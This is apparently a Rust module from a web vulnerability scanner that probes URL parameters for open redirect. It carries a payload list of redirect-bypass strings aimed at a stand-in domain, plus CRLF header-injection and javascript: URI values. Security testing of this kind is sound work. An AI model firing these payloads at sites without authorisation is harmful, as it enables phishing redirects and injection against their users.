use colored::*;
use crate::core::client::HttpClient;
use crate::core::analyzer::Analyzer;

/// Open Redirect detection
pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: Open Redirect", "[*]".yellow());

    let params = Analyzer::extract_params(target);
    if params.is_empty() {
        println!("{} No parameters found for Open Redirect testing", "[i]".cyan());
        return Ok(());
    }

    let client = HttpClient::new()?;
    let evil_domain = "evil.lzrecon.com";

    let payloads = vec![
        format!("https://{}", evil_domain),
        format!("//{}", evil_domain),
        format!("\\\\{}", evil_domain),
        format!("/\\{}", evil_domain),
        format!("https:{}", evil_domain),
        format!("//{}%2f%2e%2e", evil_domain),
        format!("////{}", evil_domain),
        format!("https://{}/..;/", evil_domain),
        format!("////{}@{}", evil_domain, evil_domain),
        format!("https://{}%40legitimate.com", evil_domain),
        format!("javascript:alert(1)//https://legitimate.com"),
        format!("%0d%0aLocation:https://{}", evil_domain),
    ];

    for (param_name, _) in &params {
        for payload in &payloads {
            let url = Analyzer::inject_param(target, param_name, payload)?;
            let result = Analyzer::send_and_analyze(&client, &url, "").await?;

            // Check Location header for redirect to evil domain
            let redirects_to_evil = result.response_headers.get("location")
                .map(|loc| loc.contains(evil_domain))
                .unwrap_or(false);

            // Check for JS-based redirect in body
            let js_redirect = result.response_body.contains(&format!("window.location=\"{}", evil_domain))
                || result.response_body.contains(&format!("location.href=\"{}", evil_domain))
                || result.response_body.contains(&format!("location.replace(\"{}", evil_domain));

            if redirects_to_evil || js_redirect {
                let method = if redirects_to_evil { "Location header" } else { "JS redirect" };
                println!(
                    "{} CONFIRMED: Open Redirect in param '{}' via {}",
                    "[!]".red().bold(), param_name, method
                );
                println!("    Payload: {}", payload);
                return Ok(());
            }
        }
    }

    Ok(())
}
